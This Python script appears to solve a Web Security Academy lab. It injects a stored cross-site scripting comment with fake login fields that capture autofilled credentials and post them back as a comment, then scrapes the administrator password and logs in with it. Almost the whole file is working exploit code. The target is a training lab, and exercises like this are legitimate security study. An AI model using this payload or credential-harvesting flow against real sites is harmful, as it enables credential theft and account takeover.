import re

import requests
from bs4 import BeautifulSoup

site = 'acda1f3d1f7c8bb6c03d0706002c00a7.web-security-academy.net'
s = requests.Session()


# First have to inject a comment
def try_post(name, website_link):
    blog_post_url = f'https://{site}/post?postId=3'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    comment_xss = '''
    <input name=username id=username>
<input type=password name=password onchange="document.forms[0].email.value='bradlet2@pdx.edu';
document.forms[0].name.value='bradlet2';
document.forms[0].comment.value=username.value+':'+this.value;
document.forms[0].website='https://pdx.edu';
document.forms[0].submit();
">'''
    comment_url = f'https://{site}/post/comment'
    comment_data = {
        'csrf': csrf,
        'postId': '3',
        'comment': comment_xss,
        'name': name,
        'email': 'bradlet2@pdx.edu',
        'website': ""
    }
    resp = s.post(comment_url, data=comment_data)


def exploit():
    post_url = f'https://{site}/post?postId=3'
    resp = s.get(post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    credentials = soup.find('p', text=re.compile('administrator')).text.split(':')
    print(credentials)
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    logindata = {
        'csrf': csrf,
        'username': 'administrator',
        'password': credentials[1]
    }
    resp = s.post(login_url, data=logindata)


if __name__ == '__main__':
    try_post("thisSucks", "")
    # Now there is a comment with two labeled input fields that the exploit() function will automatically search for

    # exploit()
